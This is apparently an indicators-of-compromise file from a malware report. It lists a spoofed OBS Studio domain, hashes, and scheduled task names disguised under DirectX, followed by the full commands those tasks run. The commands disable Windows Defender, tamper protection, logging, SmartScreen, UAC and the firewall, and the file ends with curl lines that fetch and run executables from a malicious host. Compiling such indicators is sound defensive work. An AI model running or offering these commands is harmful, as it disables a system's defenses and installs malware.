@@ -1,0 +1,320 @@
+Indicators of Compromise 
+
+obs-studio.co
+l96.org 
+7069eb6d85003f9df7cd74c45435efa0 
+50e18249b0d2bc4a4bcd35aa988e07d5
+
+
+Scheduled Task Names 
+
+Microsoft\Windows\DirectX\AccountProtection_MicrosoftAccount_Disconnected 
+Microsoft\Windows\DirectX\AdditionalActionTimeOut 
+Microsoft\Windows\DirectX\Antimalware 
+Microsoft\Windows\DirectX\AppAndBrowser_StoreAppsSmartScreenOff 
+Microsoft\Windows\DirectX\AvgCPULoadFactor 
+Microsoft\Windows\DirectX\CriticalFailureTimeOut 
+Microsoft\Windows\DirectX\DefenderApiLogge1r 
+Microsoft\Windows\DirectX\DefenderApiLogger 
+Microsoft\Windows\DirectX\DefenderAuditLogger 
+Microsoft\Windows\DirectX\DefenderAuditLogger1 
+Microsoft\Windows\DirectX\DisableAntiSpyware 
+Microsoft\Windows\DirectX\DisableAntiSpyware2 
+Microsoft\Windows\DirectX\DisableAntiSpyware3 
+Microsoft\Windows\DirectX\DisableAntiVirus 
+Microsoft\Windows\DirectX\DisableAntiVirus2 
+Microsoft\Windows\DirectX\DisableArchiveScanning 
+Microsoft\Windows\DirectX\DisableArchiveScanning1 
+Microsoft\Windows\DirectX\DisableAutoExclusions 
+Microsoft\Windows\DirectX\DisableBehaviorMonitoring 
+Microsoft\Windows\DirectX\DisableBehaviorMonitoring2 
+Microsoft\Windows\DirectX\DisableBehaviorMonitoring21 
+Microsoft\Windows\DirectX\DisableBlockAtFirstSeen 
+Microsoft\Windows\DirectX\DisableBlockAtFirstSeen1 
+Microsoft\Windows\DirectX\DisableBlockAtFirstSeen2 
+Microsoft\Windows\DirectX\DisableCatchupFullScan 
+Microsoft\Windows\DirectX\DisableCatchupQuickScan 
+Microsoft\Windows\DirectX\DisableEnhancedNotifications 
+Microsoft\Windows\DirectX\DisableEnhancedNotifications1 
+Microsoft\Windows\DirectX\DisableEnhancedNotifications2 
+Microsoft\Windows\DirectX\DisableGenericRePorts 
+Microsoft\Windows\DirectX\DisableIntrusionPreventionSystem 
+Microsoft\Windows\DirectX\DisableIOAVProtection 
+Microsoft\Windows\DirectX\DisableIOAVProtection1 
+Microsoft\Windows\DirectX\DisableIOAVProtection2 
+Microsoft\Windows\DirectX\DisableNotifications 
+Microsoft\Windows\DirectX\DisableOnAccessProtection 
+Microsoft\Windows\DirectX\DisableOnAccessProtection1 
+Microsoft\Windows\DirectX\DisablePrivacyMode 
+Microsoft\Windows\DirectX\DisablePrivacyMode2 
+Microsoft\Windows\DirectX\DisableRealtimeMonitoring 
+Microsoft\Windows\DirectX\DisableRealtimeMonitoring1 
+Microsoft\Windows\DirectX\DisableRealtimeMonitoring2 
+Microsoft\Windows\DirectX\DisableRemovableDriveScanning 
+Microsoft\Windows\DirectX\DisableRestorePoint 
+Microsoft\Windows\DirectX\DisableRoutinelyTakingAction 
+Microsoft\Windows\DirectX\DisableScanningMappedNetworkDrivesForFullScan 
+Microsoft\Windows\DirectX\DisableScanningMappedNetworkDrivesForFullScan1 
+Microsoft\Windows\DirectX\DisableScanningNetworkFiles 
+Microsoft\Windows\DirectX\DisableScanOnRealtimeEnable 
+Microsoft\Windows\DirectX\DisableScanOnRealtimeEnable1 
+Microsoft\Windows\DirectX\DisableScriptScanning 
+Microsoft\Windows\DirectX\DisableScriptScanning1 
+Microsoft\Windows\DirectX\DisableUpdateOnStartupWithoutEngine 
+Microsoft\Windows\DirectX\DontOfferThroughWUAU 
+Microsoft\Windows\DirectX\DontOfferThroughWUAU2 
+Microsoft\Windows\DirectX\DontReportInfectionInformatio 
+Microsoft\Windows\DirectX\DontReportInfectionInformation 
+Microsoft\Windows\DirectX\DontReportInfectionInformation2 
+Microsoft\Windows\DirectX\EnabledV9 
+Microsoft\Windows\DirectX\EnabledV92 
+Microsoft\Windows\DirectX\EnableFirewall 
+Microsoft\Windows\DirectX\EnableFirewall2 
+Microsoft\Windows\DirectX\EnableFirewall3 
+Microsoft\Windows\DirectX\EnableSmartScreen 
+Microsoft\Windows\DirectX\EnableWebContentEvaluation 
+Microsoft\Windows\DirectX\EnableWebContentEvaluation2 
+Microsoft\Windows\DirectX\EPP 
+Microsoft\Windows\DirectX\EPP1 
+Microsoft\Windows\DirectX\EPP2 
+Microsoft\Windows\DirectX\ExclusionExtension 
+Microsoft\Windows\DirectX\ExclusionExtension2 13 
+Microsoft\Windows\DirectX\ExclusionPath 
+Microsoft\Windows\DirectX\ExclusionProcess 
+Microsoft\Windows\DirectX\ExclusionProcess1 
+Microsoft\Windows\DirectX\ExclusionProcess2 
+Microsoft\Windows\DirectX\ExclusionProcess3 
+Microsoft\Windows\DirectX\ExecutionPolicy 
+Microsoft\Windows\DirectX\FirstAuGracePeriod 
+Microsoft\Windows\DirectX\FW 
+Microsoft\Windows\DirectX\HideSystray 
+Microsoft\Windows\DirectX\HighThreatDefaultAction 
+Microsoft\Windows\DirectX\LocalSettingOverridePurgeItemsAfterDelay 
+Microsoft\Windows\DirectX\LocalSettingOverrideSpynetReporting 
+Microsoft\Windows\DirectX\LowThreatDefaultAction 
+Microsoft\Windows\DirectX\MAPSReporting 
+Microsoft\Windows\DirectX\ModerateThreatDefaultAction 
+Microsoft\Windows\DirectX\MpEnablePus 
+Microsoft\Windows\DirectX\MpEnablePus2 
+Microsoft\Windows\DirectX\MsSecFlt 
+Microsoft\Windows\DirectX\NonCriticalTimeOut 
+Microsoft\Windows\DirectX\PreventOverride 
+Microsoft\Windows\DirectX\PreventOverride1 
+Microsoft\Windows\DirectX\PreventOverride2 
+Microsoft\Windows\DirectX\PreventOverride3 
+Microsoft\Windows\DirectX\PUAProtection 
+Microsoft\Windows\DirectX\PurgeItemsAfterDelay 
+Microsoft\Windows\DirectX\PurgeItemsAfterDelay1 
+Microsoft\Windows\DirectX\RandomizeScheduleTaskTimes 
+Microsoft\Windows\DirectX\Real-Time Protection 
+Microsoft\Windows\DirectX\ScanOnlyIfIdle 
+Microsoft\Windows\DirectX\ScanParameters 
+Microsoft\Windows\DirectX\Scan_ScheduleDay 
+Microsoft\Windows\DirectX\Scan_ScheduleTime 
+Microsoft\Windows\DirectX\ScheduleDay 
+Microsoft\Windows\DirectX\ScheduleDay2 
+Microsoft\Windows\DirectX\ScheduleTime 
+Microsoft\Windows\DirectX\ScheduleTime2 
+Microsoft\Windows\DirectX\SecurityAndMaintenance 
+Microsoft\Windows\DirectX\SecurityHealth 
+Microsoft\Windows\DirectX\SecurityHealth2 
+Microsoft\Windows\DirectX\SecurityHealthServic4e 
+Microsoft\Windows\DirectX\SecurityHealthService 
+Microsoft\Windows\DirectX\SecurityHealthService2 
+Microsoft\Windows\DirectX\Sense 
+Microsoft\Windows\DirectX\Services 
+Microsoft\Windows\DirectX\Services CHosted 
+Microsoft\Windows\DirectX\Services NHosted 
+Microsoft\Windows\DirectX\Services RHosted 
+Microsoft\Windows\DirectX\SevereThreatDefaultAction 
+Microsoft\Windows\DirectX\SignatureUpdateCatchupInterval 
+Microsoft\Windows\DirectX\SmartScreenEnabled 
+Microsoft\Windows\DirectX\SmartScreenEnabled1 
+Microsoft\Windows\DirectX\SmartScreenEnabled12 
+Microsoft\Windows\DirectX\SmartScreenEnabled2 
+Microsoft\Windows\DirectX\SmartScreenEnabled3 
+Microsoft\Windows\DirectX\SpyNetReporting 
+Microsoft\Windows\DirectX\SpynetReporting1 
+Microsoft\Windows\DirectX\SpyNetReportingLocation 
+Microsoft\Windows\DirectX\StartupApproved 
+Microsoft\Windows\DirectX\StartupApproved2 
+Microsoft\Windows\DirectX\StartupWithoutEngine 13 
+Microsoft\Windows\DirectX\SubmitSamplesConsent 
+Microsoft\Windows\DirectX\SubmitSamplesConsent1 
+Microsoft\Windows\DirectX\SubmitSamplesConsent2 
+Microsoft\Windows\DirectX\TamperProtection 
+Microsoft\Windows\DirectX\TamperProtection2 
+Microsoft\Windows\DirectX\TamperProtectionSource 
+Microsoft\Windows\DirectX\UAC Content 
+Microsoft\Windows\DirectX\UAC Popup 
+Microsoft\Windows\DirectX\WdBoot 
+Microsoft\Windows\DirectX\WdBoot1 
+Microsoft\Windows\DirectX\WdBoot2 
+Microsoft\Windows\DirectX\WdFilter 
+Microsoft\Windows\DirectX\WdFilter1 
+Microsoft\Windows\DirectX\WdFilter2 
+Microsoft\Windows\DirectX\WdNi1sSvc 
+Microsoft\Windows\DirectX\WdNis1Drv1 
+Microsoft\Windows\DirectX\WdNisDrv 
+Microsoft\Windows\DirectX\WdNisDrv2 
+Microsoft\Windows\DirectX\WdNisSvc 
+Microsoft\Windows\DirectX\WdNisSvc2 
+Microsoft\Windows\DirectX\WinDefend 
+Microsoft\Windows\DirectX\WinDefend1 
+Microsoft\Windows\DirectX\WinDefend2 
+Microsoft\Windows\DirectX\WinDefend3 
+Microsoft\Windows\DirectX\WindowsDefender 
+Microsoft\Windows\DirectX\Windows Defender1 
+
+Commands Executed by Scheduled Tasks 
+
+cmd /c powershell Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan $true -ErrorAction Ignore 
+cmd /c powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force 
+cmd /c powershell Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Ignore 
+cmd /c powershell Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction Ignore 
+cmd /c powershell Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction Ignore 
+cmd /c powershell Set-MpPreference -DisableIOAVProtection $true -ErrorAction Ignore 
+cmd /c powershell Set-MpPreference -DisablePrivacyMode $true -ErrorAction Ignore 
+cmd /c powershell Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -ErrorAction Ignore 
+cmd /c powershell Set-MpPreference -DisableArchiveScanning $true -ErrorAction Ignore 
+cmd /c powershell Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction Ignore 
+cmd /c powershell Set-MpPreference -DisableScriptScanning $true -ErrorAction Ignore 
+cmd /c powershell Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction Ignore 
+cmd /c powershell Set-MpPreference -MAPSReporting 0 -ErrorAction Ignore 
+cmd /c powershell Set-MpPreference -HighThreatDefaultAction 6 -Force -ErrorAction Ignore 
+cmd /c powershell Set-MpPreference -ModerateThreatDefaultAction 6 -ErrorAction Ignore 
+cmd /c powershell Set-MpPreference -LowThreatDefaultAction 6 -ErrorAction Ignore 
+cmd /c powershell Set-MpPreference -SevereThreatDefaultAction 6 -ErrorAction Ignore 
+cmd /c powershell Add-MpPreference -ExclusionExtension .exe -ErrorAction Ignore 
+cmd /c powershell Add-MpPreference -ExclusionExtension exe -ErrorAction Ignore 
+cmd /c powershell Add-MpPreference -ExclusionProcess cmd.exe -Force 
+cmd /c powershell Add-MpPreference -ExclusionProcess powershell.exe -Force 
+cmd /c powershell Add-MpPreference -ExclusionProcess mshta.exe -Force 
+cmd /c powershell Add-MpPreference -ExclusionProcess *.exe -Force 
+cmd /c powershell Add-MpPreference -ExclusionPath C:* -Force
+cmd /c reg add ''HKLM\SOFTWARE\Microsoft\Windows Defender\Features'' /v TamperProtection /t REG_DWORD /d 0 /f 
+cmd /c reg add ''HKLM\Software\Policies\Microsoft\Windows Defender'' /v DisableAntiSpyware /t REG_DWORD /d 1 /f 
+cmd /c reg add ''HKLM\Software\Policies\Microsoft\Windows Defender'' /v DisableAntiVirus /t REG_DWORD /d 1 /f 
+cmd /c reg add ''HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine'' /v MpEnablePus /t REG_DWORD /d 0 /f 
+cmd /c reg add ''HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection'' /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f 
+cmd /c reg add ''HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection'' /v DisableIOAVProtection /t REG_DWORD /d 1 /f 
+cmd /c reg add ''HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection'' /v DisableOnAccessProtection /t REG_DWORD /d 1 /f 
+cmd /c reg add ''HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection'' /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f 
+cmd /c reg add ''HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection'' /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f 
+cmd /c reg add ''HKLM\Software\Policies\Microsoft\Windows Defender\Reporting'' /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f 
+cmd /c reg add ''HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet'' /v DisableBlockAtFirstSeen /t REG_DWORD /d 1 /f 
+cmd /c reg add ''HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet'' /v SpynetReporting /t REG_DWORD /d 0 /f 
+cmd /c reg add ''HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet'' /v SubmitSamplesConsent /t REG_DWORD /d 0 /f 
+cmd /c reg add HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger /v Start /t REG_DWORD /d 0 /f 
+cmd /c reg add HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderAuditLogger /v Start /t REG_DWORD /d 0 /f 
+cmd /c reg delete HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run /v ''Windows Defender'' /f 
+cmd /c reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ''Windows Defender'' /f 
+cmd /c reg delete HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsDefender /f 
+cmd /c reg delete HKCR*\shellex\ContextMenuHandlers\EPP /f 
+cmd /c reg delete HKCR\Directory\shellex\ContextMenuHandlers\EPP /f 
+cmd /c reg delete HKCR\Drive\shellex\ContextMenuHandlers\EPP /f 
+cmd /c reg add HKLM\System\CurrentControlSet\Services\WdBoot /v Start /t REG_DWORD /d 4 /f 
+cmd /c reg add HKLM\System\CurrentControlSet\Services\WdFilter /v Start /t REG_DWORD /d 4 /f 
+cmd /c reg add HKLM\System\CurrentControlSet\Services\WdNisDrv /v Start /t REG_DWORD /d 4 /f 
+cmd /c reg add HKLM\System\CurrentControlSet\Services\WdNisSvc /v Start /t REG_DWORD /d 4 /f 
+cmd /c reg add HKLM\System\CurrentControlSet\Services\WinDefend /v Start /t REG_DWORD /d 4 /f 
+cmd /c reg add HKLM\System\CurrentControlSet\Services\SecurityHealthService /v Start /t REG_DWORD /d 4 /f 
+cmd /c reg add HKLM\System\ControlSet001\Services\WdBoot /v Start /t REG_DWORD /d 4 /f 
+cmd /c reg add HKLM\System\ControlSet001\Services\WdFilter /v Start /t REG_DWORD /d 4 /f 
+cmd /c reg add HKLM\System\ControlSet001\Services\WdNisDrv /v Start /t REG_DWORD /d 4 /f 
+cmd /c reg add HKLM\System\ControlSet001\Services\WdNisSvc /v Start /t REG_DWORD /d 4 /f 
+cmd /c reg add HKLM\System\ControlSet001\Services\WinDefend /v Start /t REG_DWORD /d 4 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection'' /v DpaDisabled /t REG_DWORD /d 1 /f 
+cmd /c netsh advfirewall set allprofiles state off 
+cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f 
+cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications'' /v DisableNotifications /t REG_DWORD /d 1 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications'' /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f 
+cmd /c reg add ''HKLM\NTUSER\SOFTWARE\Microsoft\Windows Security Health\State'' /v AccountProtection_MicrosoftAccount_Disconnected /t REG_DWORD /d 0 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Microsoft\Windows Defender'' /v DisableAntiSpyware /t REG_DWORD /d 1 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Microsoft\Windows Defender'' /v DisableAntiVirus /t REG_DWORD /d 1 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Microsoft\Windows Defender\Features'' /v TamperProtection /t REG_DWORD /d 4 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Microsoft\Windows Defender\Features'' /v TamperProtectionSource /t REG_DWORD /d 2 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Microsoft\Windows Defender\Signature Updates'' /v FirstAuGracePeriod /t REG_DWORD /d 0 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Microsoft\Windows Defender\UX Configuration'' /v DisablePrivacyMode /t REG_DWORD /d 1 /f 
+cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run /v SecurityHealth /t REG_BINARY /d 030000000000000000000000 /f 
+cmd /c reg add HKLM\SOFTWARE\Policies\Microsoft\MRT /v DontOfferThroughWUAU /t REG_DWORD /d 1 /f 
+cmd /c reg add HKLM\SOFTWARE\Policies\Microsoft\MRT /v DontReportInfectionInformation /t REG_DWORD /d 1 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Systray'' /v HideSystray /t REG_DWORD /d 1 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Policies\Microsoft\Windows Defender'' /v DisableAntiSpyware /t REG_DWORD /d 1 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Policies\Microsoft\Windows Defender'' /v PUAProtection /t REG_DWORD /d 0 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Policies\Microsoft\Windows Defender'' /v RandomizeScheduleTaskTimes /t REG_DWORD /d 0 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions'' /v DisableAutoExclusions /t REG_DWORD /d 1 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\MpEngine'' /v MpEnablePus /t REG_DWORD /d 0 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Quarantine'' /v LocalSettingOverridePurgeItemsAfterDelay /t REG_DWORD /d 0 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Quarantine'' /v PurgeItemsAfterDelay /t REG_DWORD /d 0 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection'' /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection'' /v DisableIOAVProtection /t REG_DWORD /d 1 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection'' /v DisableOnAccessProtection /t REG_DWORD /d 1 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection'' /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection'' /v DisableRoutinelyTakingAction /t REG_DWORD /d 1 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection'' /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection'' /v DisableScriptScanning /t REG_DWORD /d 1 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Remediation'' /v Scan_ScheduleDay /t REG_DWORD /d 8 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Remediation'' /v Scan_ScheduleTime /t REG_DWORD /d 0 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting'' /v AdditionalActionTimeOut /t REG_DWORD /d 0 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting'' /v CriticalFailureTimeOut /t REG_DWORD /d 0 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting'' /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting'' /v DisableGenericRePorts /t REG_DWORD /d 1 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting'' /v NonCriticalTimeOut /t REG_DWORD /d 0 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Scan'' /v AvgCPULoadFactor /t REG_DWORD /d 10 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Scan'' /v DisableArchiveScanning /t REG_DWORD /d 1 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Scan'' /v DisableCatchupFullScan /t REG_DWORD /d 1 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Scan'' /v DisableCatchupQuickScan /t REG_DWORD /d 1 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Scan'' /v DisableRemovableDriveScanning /t REG_DWORD /d 1 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Scan'' /v DisableRestorePoint /t REG_DWORD /d 1 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Scan'' /v DisableScanningMappedNetworkDrivesForFullScan /t REG_DWORD /d 1 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Scan'' /v DisableScanningNetworkFiles /t REG_DWORD /d 1 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Scan'' /v PurgeItemsAfterDelay /t REG_DWORD /d 0 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Scan'' /v ScanOnlyIfIdle /t REG_DWORD /d 0 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Scan'' /v ScanParameters /t REG_DWORD /d 0 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Scan'' /v ScheduleDay /t REG_DWORD /d 8 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Scan'' /v ScheduleTime /t REG_DWORD /d 0 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates'' /v DisableUpdateOnStartupWithoutEngine /t REG_DWORD /d 1 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates'' /v ScheduleDay /t REG_DWORD /d 8 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates'' /v ScheduleTime /t REG_DWORD /d 0 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates'' /v SignatureUpdateCatchupInterval /t REG_DWORD /d 0 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\SpyNet'' /v DisableBlockAtFirstSeen /t REG_DWORD /d 1 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet'' /v LocalSettingOverrideSpynetReporting /t REG_DWORD /d 0 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet'' /v SpyNetReporting /t REG_DWORD /d 0 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet'' /v SpyNetReportingLocation /t REG_MULTI_SZ /d 0 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet'' /v SubmitSamplesConsent /t REG_DWORD /d 2 /f
+cmd /c reg add HKLM\SYSTEM\ControlSet001\Services\EventLog\System\Microsoft-Antimalware-ShieldProvider /v Start /t REG_DWORD /d 4 /f 
+cmd /c reg add HKLM\SYSTEM\ControlSet001\Services\EventLog\System\WinDefend /v Start /t REG_DWORD /d 4 /f 
+cmd /c reg add HKLM\SYSTEM\ControlSet001\Services\MsSecFlt /v Start /t REG_DWORD /d 4 /f 
+cmd /c reg add HKLM\SYSTEM\ControlSet001\Services\SecurityHealthService /v Start /t REG_DWORD /d 4 /f 
+cmd /c reg add HKLM\SYSTEM\ControlSet001\Services\Sense /v Start /t REG_DWORD /d 4 /f 
+cmd /c reg add HKLM\SYSTEM\ControlSet001\Services\WdBoot /v Start /t REG_DWORD /d 4 /f 
+cmd /c reg add HKLM\SYSTEM\ControlSet001\Services\WdFilter /v Start /t REG_DWORD /d 4 /f 
+cmd /c reg add HKLM\SYSTEM\ControlSet001\Services\WdNisDrv /v Start /t REG_DWORD /d 4 /f 
+cmd /c reg add HKLM\SYSTEM\ControlSet001\Services\WdNisSvc /v Start /t REG_DWORD /d 4 /f 
+cmd /c reg add HKLM\SYSTEM\ControlSet001\Services\WinDefend /v Start /t REG_DWORD /d 4 /f 
+cmd /c reg add HKLM\SYSTEM\ControlSet001\Control\WMI\Autologger\DefenderApiLogger /v Start /t REG_DWORD /d 0 /f 
+cmd /c reg add HKLM\SYSTEM\ControlSet001\Control\WMI\Autologger\DefenderAuditLogger /v Start /t REG_DWORD /d 0 /f 
+cmd /c reg add HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile /v EnableFirewall /t REG_DWORD /d 0 /f 
+cmd /c reg add HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\PublicProfile /v EnableFirewall /t REG_DWORD /d 0 /f 
+cmd /c reg add HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile /v EnableFirewall /t REG_DWORD /d 0 /f 
+cmd /c reg add HKLM\DEFAULT\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost /v EnableWebContentEvaluation /t REG_DWORD /d 0 /f 
+cmd /c reg add HKLM\DEFAULT\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost /v PreventOverride /t REG_DWORD /d 0 /f 
+cmd /c reg add HKLM\DEFAULT\SOFTWARE\Policies\Microsoft\Edge /v SmartScreenEnabled /t REG_DWORD /d 0 /f 
+cmd /c reg add HKLM\NTUSER\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost /v EnableWebContentEvaluation /t REG_DWORD /d 0 /f 
+cmd /c reg add HKLM\NTUSER\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost /v PreventOverride /t REG_DWORD /d 0 /f 
+cmd /c reg add HKLM\NTUSER\SOFTWARE\Policies\Microsoft\Edge /v SmartScreenEnabled /t REG_DWORD /d 0 /f 
+cmd /c reg add ''HKLM\SOFTWARE\Microsoft\Windows Security Health\State'' /v AppAndBrowser_StoreAppsSmartScreenOff /t REG_DWORD /d 0 /f 
+cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost /v SmartScreenEnabled /t REG_SZ /d Off /f 
+cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer /v SmartScreenEnabled /t REG_SZ /d Off /f 
+cmd /c reg add HKLM\SOFTWARE\Policies\Microsoft\Internet Explorer\PhishingFilter /v EnabledV9 /t REG_DWORD /d 0 /f 
+cmd /c reg add HKLM\SOFTWARE\Policies\Microsoft\Internet Explorer\PhishingFilter /v PreventOverride /t REG_DWORD /d 0 /f 
+cmd /c reg add HKLM\SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter /v EnabledV9 /t REG_DWORD /d 0 /f 
+cmd /c reg add HKLM\SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter /v PreventOverride /t REG_DWORD /d 0 /f 
+cmd /c reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\System /v EnableSmartScreen /t REG_DWORD /d 0 /f 
+cmd /c %windir%\system32\curl.exe http://l96[.]org/n.exe -o %windir%\n.exe & %windir%\n.exe 
+cmd /c %windir%\system32\curl.exe http://l96[.]org/r.exe -o %windir%\r.exe & %windir%\r.exe 
+cmd /c %windir%\system32\curl.exe http://l96[.]org/c.exe -o %windir%\c.exe & %windir%\c.exe 
+
+
